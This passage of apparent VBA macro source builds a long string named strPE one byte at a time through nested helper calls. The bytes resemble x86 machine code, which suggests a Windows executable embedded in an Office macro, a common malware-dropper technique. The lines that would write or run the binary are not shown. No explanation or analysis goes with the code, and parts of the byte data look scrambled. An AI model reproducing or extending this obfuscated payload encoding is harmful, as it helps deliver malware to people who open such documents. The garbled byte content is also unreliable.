    strPE = B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 0), 131), 196), 12), 133), 192), "t"), 15), "PhT"), 210), "@"), 0), 255), 21), 30), 193), "@"), 0), 131), 196), 8), "j"), 1), 255), 21), "}"), 193), "@"), 0), 144), 251), 139), 236), 129), 236), 184), 0), 0), 0), 161), 141), 2), "A"), 0), 133), 129), 161), "L")
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(strPE, "@A"), 0), "t"), 20), 157), "h$A"), 0), 7), 232), 158), "@"), 0), 207), "f"), 139), 13), "I"), 2), "A"), 0), 235), 20), "o"), 21), 167), "cA"), 0), "RP"), 232), 136), "@"), 0), "8f"), 139), 13), 244), 192), "A"), 0), 163), 182), 148), 204), 24)
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 210), 136), 2), 189), 0), 219), "V"), 139), "5d"), 193), "@"), 0), 137), 137), 13), 180), 11), "A"), 0), 133), 192), "Wu]"), 139), "/"), 0), 152), "s"), 0), "Rh"), 152), 212), "@"), 229), 255), 214), 161), "x^A"), 0), 131), 196), 8), 246), 192), "t")
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 21), 206), "t"), 2), "ASPh@<A"), 0), "h"), 191), 212), "@"), 138), 255), 214), 131), 196), 157), 161), 20), 208), "@"), 0), 133), 192), 184), "_"), 212), 129), 0), "u"), 5), 184), "|"), 212), 229), "RPgl"), 212), "@"), 169), 255), 214), 139)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 207), 6), 192), 30), 0), 217), 193), " `"), 255), 21), "T"), 193), 204), 0), 131), 196), 12), 139), 185), "<"), 4), 170), 0), 228), "=X"), 193), "@6h`"), 8), 0), 0), "R"), 255), 214), 163), 176), 11), 9), 0), 198), 16), 208), "@"), 0), "j ")
    strPE = A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "P"), 255), 214), "MPL@A/"), 139), 21), 24), 208), "@"), 0), 131), 196), 16), 163), ":"), 218), 160), 0), "j\QRh"), 248), 23), "A"), 0), 232), 129), 183), 0), 238), ">"), 192), "t"), 14), "PhP@@"), 0), 232), 162), 5)
    strPE = A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 0), 0), 131), "E"), 8), 161), "|"), 2), 196), "+"), 129), 192), "u!'"), 172), 11), "&"), 0), 139), 13), 237), 11), "A"), 0), 139), 21), "H@A"), 0), "jE"), 130), 156), 209), "@"), 0), 133), 161), "L@A"), 0), "QhH"), 212), 139), 0)
    strPE = A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "RP"), 232), 187), "?"), 0), 0), 131), 196), 28), 163), "<@A"), 136), 160), 5), 161), "1@A"), 0), 139), "|"), 128), 2), 225), 0), 133), 201), "u&"), 139), 198), "L"), 175), 221), "{j"), 0), "h"), 156), 209), "@"), 0), 170), "Df@"), 27)
    strPE = A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(strPE, "h"), 163), 212), "@"), 0), "CQ"), 232), 132), "?D"), 0), 131), 196), 24), 163), "H@A"), 0), 139), 13), 132), 2), "A"), 0), 133), 201), "u"), 28), 139), 21), "L@V"), 0), "j"), 0), "h"), 24), 16), "@"), 0), "PR"), 232), 220), "?"), 0), 0)
    strPE = B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 131), 196), 165), 163), 147), "KA"), 0), 139), 13), "`"), 2), 244), 0), 133), 201), ".g"), 139), 21), "h"), 2), 198), 151), 239), 252), 223), "@"), 0), 133), 210), "u"), 5), 190), 212), 2), 202), 165), "M"), 21), "x"), 2), "@"), 0), 192), 210), 139), 21), "@7")
    strPE = B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "A"), 0), 5), "v"), 139), "\"), 228), 171), 186), 130), 133), 140), 185), 248), 211), "k"), 0), "t"), 5), 14), 240), 211), "@wP"), 161), 4), 24), "A"), 0), "P"), 161), "D@"), 159), 0), 215), "VRQ"), 139), 15), "0"), 182), "@"), 0), "h"), 212), 211), "@")
    strPE = B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(strPE, 0), "h"), 0), "\"), 0), 13), "QK"), 24), "l"), 0), 0), 186), 246), 188), 235), 235), 138), 21), 249), "8A"), 0), 191), "@8A"), 0), 132), 210), "u"), 5), 191), 200), 211), "@"), 1), 139), 21), "h"), 2), "A"), 0), 190), 252), 211), "@"), 0), 133), "U")
    strPE = A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(strPE, "u"), 5), 190), 212), 2), "A"), 0), 139), 204), "x:5"), 0), 133), 210), 139), 21), 241), "@A'u+"), 139), 21), 249), 23), "A"), 0), 131), 249), 1), 185), 195), 211), 157), 0), "t"), 5), "w"), 188), 211), 154), 0), "P"), 161), "b"), 2), "A"), 0)
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "WP"), 161), 4), 232), "A"), 0), "P"), 161), "D@A"), 0), "PV"), 185), "Q"), 139), 13), "0"), 208), "@"), 0), "hx"), 211), "@"), 0), "h"), 0), 8), ")"), 0), "Q"), 232), 246), 152), 0), 231), 205), 196), ",="), 0), 8), 0), 0), "r"), 13), "h")
    strPE = B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 17), 211), "@"), 0), 232), 27), 130), 255), 255), 131), "t"), 4), 161), "X"), 2), 154), "]"), 187), 2), 0), 0), 8), ";"), 195), "|"), 163), 214), "`"), 2), "A"), 0), 234), 195), 206), 188), 211), "@"), 0), "\"), 187), 184), "1"), 211), "@"), 0), 139), 21), "0"), 208), "@")
    strPE = A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(strPE, 0), "RPhD"), 211), "@"), 224), 255), 21), "d"), 193), "r"), 0), "/"), 196), 12), 139), 170), 180), 208), "`"), 0), 131), 201), 255), "3"), 192), 242), 174), 161), 19), 2), "A"), 0), 247), 209), "I"), 131), 248), 1), "D"), 13), "N"), 23), "A"), 0), "|p"), 161)
    strPE = A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "pdA"), 0), 141), "L"), 1), 1), "Q"), 255), 21), "\"), 193), 240), 0), 131), 196), "5"), 133), 192), "u"), 31), 139), 21), 200), 192), "@"), 0), "h"), 152), 134), "@"), 0), 131), 194), ":R"), 232), "("), 128), 193), 238), 0), 131), 196), 8), "_^["), 139)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(strPE, 229), "]"), 195), 220), "j0"), 208), "@q"), 139), 240), 138), 10), "B"), 136), 14), 11), 240), 201), "u"), 246), 139), 21), 236), 23), 210), 0), 205), 13), "p"), 2), 15), 0), 139), "5 8A"), 0), 141), "<"), 2), 139), 209), 22), 233), 2), 243), 165), 139)
    strPE = A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 202), 20), 225), 3), "l"), 164), 206), "0"), 208), 4), 0), 161), "L@"), 224), 0), "f"), 139), 13), 180), 11), "A"), 0), 139), 21), 8), "D"), 175), 0), "PjY(j"), 0), "Rh"), 252), 23), "."), 0), 232), "wT"), 0), 0), 144), 240), "f"), 133)
    strPE = B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 246), " ,"), 205), 8), 24), "A"), 0), 141), 141), "H"), 255), 255), 10), "PU"), 21), 210), "C"), 0), "jx"), 191), 232), ">k"), 0), 0), 211), 191), 214), 141), 203), "H"), 255), 255), 255), "RP"), 232), 237), 2), 0), 0), 131), 196), "$"), 195), 166), "N")
    strPE = A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 0), 211), 130), 240), 161), "d"), 201), "A"), 0), 139), 250), 137), "5"), 160), 11), 254), 142), 133), 192), 137), "="), 164), 11), "A"), 151), 137), "5"), 192), 11), "A"), 180), 137), "="), 196), "G3"), 164), "t"), 27), 153), "j"), 0), 2), "@B"), 15), "?R"), 31), 232)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 178), 148), 0), 0), 3), "s"), 19), 215), 137), "E"), 236), 137), "U"), 240), 235), 3), 199), "K"), 236), 255), 255), 255), 255), 199), "E"), 240), 255), 255), 255), 127), "h"), 171), " @"), 0), "S"), 255), 21), 193), 193), 144), 0), 161), 24), 208), "@"), 0), 131), 196), 8)
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(strPE, "3"), 246), 133), 192), "~13"), 255), 139), 13), 9), 11), "A"), 156), 137), 180), 15), "X"), 8), 145), 0), 224), 21), 176), 11), "A"), 0), 141), 4), 23), 187), 232), 128), 28), 0), 0), 161), 24), 252), "@"), 0), 131), 196), 4), 193), 129), 199), "`"), 8), 233)
    strPE = B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 0), ";"), 240), "|"), 209), 139), 25), 24), 208), 20), 0), 141), "X"), 232), 137), "M"), 252), 139), 13), 150), 208), 144), 0), 141), "E"), 252), "R"), 139), 21), "("), 208), "@"), 0), "P"), 161), 248), 23), "A"), 0), "QR;"), 1), 131), 228), 223), 34), 133), 223), "t")
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 14), "Ph"), 232), 210), "@"), 0), 232), 20), 2), 0), 0), 131), 196), 8), 139), "2"), 252), 133), 192), "u"), 191), "C"), 212), 215), "@"), 0), 232), 223), 12), 255), 255), 131), "5V"), 139), "Er"), 199), "E"), 244), 0), 0), 0), 0), 133), 192), 15), 138), "_")
    strPE = A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 225), 0), 0), "-E"), 248), 0), 0), "p"), 0), 139), "M"), 166), 139), 144), 232), 139), "t"), 215), 212), 211), "N"), 8), 133), 201), 15), 240), ")E"), 0), 0), 215), 8), 248), "f"), 174), 173), 173), 128), 246), "O#t"), 9), "V"), 232), 220), 31), 162), 0)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 205), 196), 4), 10), 195), "R"), 15), 133), 230), 0), 0), 0), 246), 195), 4), 15), 132), 177), 0), 0), 0), 131), "~"), 8), 1), "?("), 158), 0), 0), 16), 161), 252), 23), "A"), 0), 160), 218), 4), "PQ"), 232), 142), "K"), 0), 0), 183), 13), 248), 23)

    PE2 = strPE
End Function

Private Function PE3() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(strPE, "A"), 0), 139), "V"), 4), 139), 200), 141), "5"), 192), "P["), 199), "E"), 196), 1), 223), 0), 161), 137), "U"), 204), 232), "/"), 4), 0), 0), "f"), 133), "\tW#V"), 178), "R"), 232), "1K"), 0), 0), 139), 29), 226), 2), "A"), 0), 161), 184), 2)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "A"), 0), "C"), 139), "i@"), 147), 249), 10), 137), 29), 196), 2), "A"), 0), 163), 184), 2), 184), 0), 234), "&E"), 21), "8"), 192), "@"), 0), "h"), 176), 210), "@"), 0), 131), 194), "FR"), 127), 21), 128), 193), "@"), 221), 15), 191), 199), "P8"), 133), 144)
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(strPE, "@"), 0), "#"), 31), ">"), 0), 141), 131), ")"), 16), 199), "F"), 8), "A"), 0), 0), 0), 27), "c"), 199), "F"), 8), 2), 0), 0), 0), 139), 21), "S"), 2), "A"), 0), "BX"), 21), 168), 2), "A"), 0), "VaY"), 1), 0), "W"), 131), 196), 4), 131), "~")
    strPE = A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 8), 3), "uI"), 139), "N"), 4), 234), 1), 0), 0), 0), 26), "E"), 216), "f"), 137), "E"), 220), 161), 248), 23), "A"), 0), 141), "U"), 212), "R"), 155), 137), "M"), 179), 137), "u"), 160), 232), "L"), 234), 0), "Kv#"), 139), "="), 184), 2), "j"), 0), 139), 21)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 20), 2), "A"), 0), "GB"), 137), "="), 184), 2), "A"), 0), 173), 21), 204), 31), "T"), 0), "V"), 232), 136), 26), 234), 229), 131), 196), 4), 139), ")"), 244), 139), "U"), 248), 139), "M"), 252), "@"), 131), 194), 20), ";"), 193), 23), "E"), 244), 137), 255), 248), 15), 140)
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(strPE, 168), 219), 27), 255), 139), 13), ">"), 11), 31), "@"), 139), "E"), 240), 150), 200), 161), 172), 2), "H["), 127), 27), "|"), 13), 9), 21), 160), 11), "AT"), 139), "M"), 236), ";"), 209), "s"), 12), ";"), 5), 16), 208), "@"), 0), 15), 140), 18), 254), "V"), 255), "/")
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 13), 20), 208), 146), 0), 133), 201), 137), 26), "P"), 161), 193), 239), "@#"), 131), 192), "@h"), 128), 210), "@"), 0), 254), 255), "{"), 128), "m@"), 0), 131), 196), 12), 235), 171), "hxS@VH"), 218), "d"), 193), 159), 195), 131), 196), 4), 161)
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 136), 2), "A"), 190), 239), 192), "t"), 12), 232), 223), 19), 0), 0), 143), "^["), 139), 229), "]"), 195), "j"), 0), 173), "1"), 2), 0), 0), 131), 196), 4), "_^"), 9), 139), 229), "]"), 195), "i"), 144), 144), 11), 144), 144), 144), "U"), 139), 236), 131), 236), "x")
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(strPE, "V7u{VBE"), 136), "F}PV"), 232), 247), "h"), 192), 168), 139), "M"), 8), 139), 21), 200), 192), "i"), 0), 27), 199), 131), "I@I"), 233), 212), "@"), 0), "R"), 255), 21), 128), 249), 159), 0), 161), 172), 2), "A"), 0), 131), "j")
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "$"), 133), " "), 222), "HP"), 188), "T"), 210), "A"), 0), 255), 21), "d"), 193), "@"), 0), 9), 173), 8), "V"), 255), 21), "p"), 193), 219), 0), "^Y"), 144), "J"), 144), 144), 144), 144), 144), 144), 144), 144), 144), "B"), 7), 236), 131), 236), 20), "SV~u")
    strPE = A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 8), 185), 229), "<"), 20), 137), "E"), 8), "xIK"), 0), 0), 163), 160), 11), "A"), 0), 137), 186), "T"), 195), "A"), 0), 139), 216), 139), "F"), 20), 133), 192), 139), "*u"), 144), 192), "N"), 4), "j"), 195), "j"), 0), "Q"), 232), "Sm"), 154), 228), "e"), 158)
    strPE = A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(strPE, "8"), 8), 0), 0), 137), 197), "<"), 214), 27), 0), 199), "F"), 24), 0), 0), 0), 0), 139), 21), 236), 23), "A"), 0), 137), "V"), 20), 161), "`"), 2), 175), 0), 133), "Kt"), 19), 29), "p"), 232), "AN"), 139), 202), 3), 20), 137), "N"), 20), "--"), 139)
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(strPE, "C8"), 135), 0), 220), 161), "(m@"), 0), 139), 21), 8), 208), "@"), 0), "r"), 200), 139), 134), "<"), 8), 0), 0), 169), 194), ";"), 192), 15), 143), 229), 5), "H"), 0), "|"), 8), ";"), 217), 185), 135), 219), 0), 0), 0), 139), "V"), 24), 139), 29), "0")
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(strPE, 208), 25), 154), 250), "F"), 4), 244), "M"), 8), 244), 211), "QRP"), 232), "mk"), 218), 0), 133), 192), "t"), 29), 131), 248), 11), "t.=h"), 253), 10), 0), "t'="), 217), 252), 135), 0), "t "), 129), "W"), 253), "'"), 0), "r"), 25), 14)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(strPE, "$"), 253), 136), 0), "t"), 18), "="), 161), 252), 10), 0), "t"), 11), "="), 179), "#"), 11), 0), 15), 133), 166), 0), 0), 0), 139), "E"), 203), 139), 209), 160), 2), "A"), 0), 139), "="), 164), 2), "A"), 0), 3), 216), 131), 215), 239), "?"), 29), 160), 2), "A"), 0)
    strPE = B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 137), 210), 129), 2), "AA"), 184), "V"), 24), 139), "N"), 20), 3), 208), "+"), 138), 137), "V"), 24), 137), "N"), 20), 231), "!"), 236), 254), 255), 255), 199), 128), "u"), 3), 0), 0), 0), 232), "4"), 179), 0), 0), "!"), 160), 11), "A"), 0), 137), 21), 164), 11), "A")
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 0), 139), "V"), 4), 137), 134), "@"), 8), 0), 0), 139), 13), "v"), 11), 127), 0), 184), "a"), 0), 191), ";"), 31), "E"), 240), "feE"), 244), 137), 142), 4), 8), 251), 0), 139), 13), 248), 23), "A"), 0), 141), "E"), 236), 137), "U"), 221), "PQ"), 137), "u")
    strPE = B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 252), 232), 178), 245), 0), 0), "_^["), 139), 229), "]"), 200), 243), 212), 212), "@"), 155), 255), 21), "d"), 193), "@"), 0), "V"), 232), "j"), 26), 0), 0), 131), 128), 8), "_^["), 223), 229), 233), 195), 139), "<"), 188), 2), "A"), 0), "h"), 188), 212), "@")
    strPE = A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(strPE, "lCj"), 29), 188), 2), "A"), 0), 255), 21), 236), 26), "J[V"), 232), "B"), 223), 0), 0), 131), 196), ")_^["), 139), 229), 192), 195), 144), 144), 144), 144), "C"), 144), 144), 144), "U"), 139), 236), 129), "G"), 188), 0), 0), 0), 139), "E"), 8)
    strPE = A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 133), 192), 233), 204), 232), 157), "I"), 0), 135), 134), 160), 11), "A"), 0), 137), 21), 164), 11), "A"), 0), "F*"), 139), 21), 164), 11), "A"), 0), 220), 160), 11), "A"), 0), "S"), 139), "6"), 192), 11), 202), 0), "IW"), 139), "="), 196), 11), "Af+"), 195)
    strPE = A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(strPE, 27), 215), 186), "E"), 216), 137), "U"), 220), 139), "5d"), 193), "@"), 136), "cm"), 129), "h"), 191), 223), "@"), 0), 220), 13), "*"), 194), "@"), 0), 221), "]"), 208), 255), 214), "h"), 162), 19), "A"), 0), 151), 152), 223), "@"), 0), 255), 214), 161), 159), 163), "A"), 0)
    strPE = B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(strPE, "Ph|"), 223), "@"), 0), 23), 208), "3"), 201), "f"), 139), 13), 244), 23), "A"), 0), ":h\"), 223), "@"), 0), 255), 214), "h"), 128), 212), "@"), 0), 255), 214), 139), 21), 228), 23), "A8Rh@"), 223), "@"), 0), 183), 214), "E"), 24), 2), "A")
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 0), "P"), 239), 28), 223), "@"), 0), 255), 214), "h"), 128), 148), "@"), 168), 255), 214), 139), 13), 244), "~@"), 0), "Qh"), 151), 223), "@"), 0), 255), 214), 139), "U}"), 139), "E"), 208), "RPh"), 216), 222), 221), 7), 255), 214), 139), 147), 148), 2), "A")
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(strPE, 0), 131), 196), "HQ"), 130), 188), 222), "@"), 0), "'"), 214), 139), 21), 184), 2), "R"), 216), "R"), 255), "`"), 222), "@"), 0), 255), 214), 161), 184), 2), "A"), 0), 131), 164), 16), 133), 249), "R$"), 161), 204), 2), "A"), 0), 139), 13), 145), 2), "A"), 0), 139)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(strPE, 21), 200), 2), 13), 0), "P"), 161), 196), 2), "A"), 0), "QRPhdU"), 0), 0), 255), ";"), 131), 196), 20), 139), 13), 188), 248), "A"), 0), "Qh"), 249), 222), 244), "["), 255), "o"), 161), 208), 2), 165), 0), 131), 196), 8), 133), 192), "t"), 11)
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "Ph,"), 222), "@"), 0), 255), 214), 131), 196), 8), 161), 221), 152), "A"), 0), 133), 192), "t"), 17), "p"), 21), 176), 2), "A"), 193), "Rh"), 148), 222), "@w"), 255), 214), 131), 196), 194), 161), 148), 2), "A"), 0), 139), 13), 144), "6A"), 0), "PQ")
    strPE = A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(strPE, "h"), 232), 221), "@"), 0), 255), 214), 161), "`"), 2), "A"), 0), 238), 196), 12), 131), 248), 1), "u"), 23), 155), 21), 163), 2), "Ax"), 205), 160), 2), "A"), 0), "R"), 180), "h"), 200), 221), "@2%"), 214), 131), 168), 12), 16), "="), 138), 180), "A"), 0), 141)
    strPE = A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(strPE, "u"), 24), "N"), 13), 164), 2), "A"), 0), 139), 21), 160), "*A"), 0), "QR"), 173), 211), 239), "/"), 0), 255), 214), "f"), 196), 12), 161), 156), 2), "A"), 0), 139), 13), 152), 2), "A"), 0), "P@h"), 128), 221), "@"), 174), "#"), 194), 221), "&"), 178), 220)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(strPE, 29), 229), 235), "@"), 0), 131), 196), 12), "Q-"), 172), 196), "DP"), 139), 238), ">"), 0), 0), 161), 172), 2), 18), 0), "d"), 192), 15), 132), "w"), 192), 0), 0), 221), 5), "("), 194), "@"), 0), 220), "u"), 208), 235), 6), 8), 221), "]U"), 219), 5), 172)
    strPE = A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(strPE, 2), "A"), 0), 220), "Md"), 221), 28), 195), "hP"), 221), "@"), 212), 198), 214), 219), 5), 24), "|@"), 0), "x"), 2), 4), 220), 247), 208), 220), 13), " "), 194), "@"), 0), 218), "5"), 1), 2), "A"), 29), 221), 239), 170), "hz"), 221), "@"), 0), 255), 214)
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(strPE, 221), "E"), 208), 220), 131), " "), 194), "@"), 0), 131), 196), 4), 237), "5"), 172), 2), "A"), 141), 221), 28), "$h"), 216), "A@"), 0), 255), 214), 223), "-"), 144), 2), "A"), 0), 131), 196), 214), 220), "M"), 194), 220), 13), 24), "V@"), 0), 221), 28), "$h")
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 164), 220), "@"), 0), 255), 214), 161), 127), 2), "A"), 0), 131), 196), 12), 133), 192), "~Y"), 223), "+"), 14), 2), "A"), 0), "&"), 236), 8), 220), "M"), 153), 220), 13), 24), 194), "@"), 0), "K"), 181), "|h"), 201), 220), "@"), 0), 255), 187), 139), 21), 160), 2)
